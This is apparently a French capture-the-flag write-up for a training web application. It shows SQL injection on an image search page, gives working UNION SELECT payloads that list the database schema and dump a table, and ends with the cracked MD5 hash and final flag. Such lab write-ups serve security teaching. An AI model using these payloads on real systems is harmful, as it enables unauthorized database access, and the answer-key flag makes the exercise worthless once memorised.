Injection SQL IMAGE NUMBER

Dans l'onglet SEARCH IMAGE : http://IP/?page=searchimg

En tapant la commande SQL '1 OR true'

Nous pouvons voir toutes les listes_images créé :

ID: 1 OR TRUE 
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_

ID: 1 OR TRUE 
Title: 42 !
Url : https://fr.wikipedia.org/wiki/Fichier:42

ID: 1 OR TRUE 
Title: Google
Url : https://fr.wikipedia.org/wiki/Logo_de_Go

ID: 1 OR TRUE 
Title: Earth
Url : https://en.wikipedia.org/wiki/Earth#/med

ID: 1 OR TRUE 
Title: Hack me ?
Url : borntosec.ddns.net/images.png

Nous allons faire la commande SQL suivantes pour afficher toutes les tables et colonnes associé '1 UNION SELECT table_name, column_name FROM information_schema.columns'

On va s'intéresser à la table 'list_images' :

LIST_IMAGES(id, url, title, comment)

Nous allons afficher les valeurs de title et comment grâce à la commande SQL '1 UNION SELECT comment, title FROM list_images'

Ce qui nous donne les valeurs suivantes :

Title: Hack me ?
Url : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46

Si on déchiffre le code 1928e8083cf461a51303633093573c46 en MD5 on obtient albatroz, et si on le chiffre en SHA256 on obtient : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
